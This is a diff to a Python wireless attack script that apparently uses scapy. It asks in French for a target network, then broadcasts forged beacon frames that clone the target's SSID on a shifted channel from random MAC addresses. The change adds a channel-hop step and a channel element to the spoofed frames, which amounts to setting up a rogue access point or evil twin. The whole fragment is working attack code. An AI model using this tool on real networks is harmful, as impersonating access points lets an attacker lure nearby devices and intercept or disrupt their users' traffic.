@@ -23,17 +23,17 @@ def add_network(pkt):
 
 
 def channel_hop(ch):
-    new_ch = (ch + 6) % 12
-    return new_ch
-
+    new_ch = (int(ch) + 6) % 14
+    return int(new_ch)
 
 def generate_beacon(iface, ssid, ch):
     sender_MAC = RandMAC()
     # 802.11 frame
     dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_MAC, addr3=sender_MAC)
     bc = Dot11Beacon(cap="ESS+privacy")
+    channel = Dot11Elt(ID="DSset", info=chr(ch))
     essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-    pkt = RadioTap() / dot11 / bc / essid
+    pkt = RadioTap() / dot11 / bc / essid / channel
     sendp(pkt, iface=iface, loop=2, inter=0.2)
 
 
@@ -58,5 +58,7 @@ if __name__ == "__main__":
     tg_index = int(input("Tapez le numero de la cible : "))
     tg_ch = channels[int(tg_index) - 1]
     tg_ssid = ssids[int(tg_index - 1)]
-
-    generate_beacon(interface, tg_ssid, tg_ch)
+    
+    hop_Ch = channel_hop(tg_ch)
+    
+    generate_beacon(interface, tg_ssid, hop_Ch)
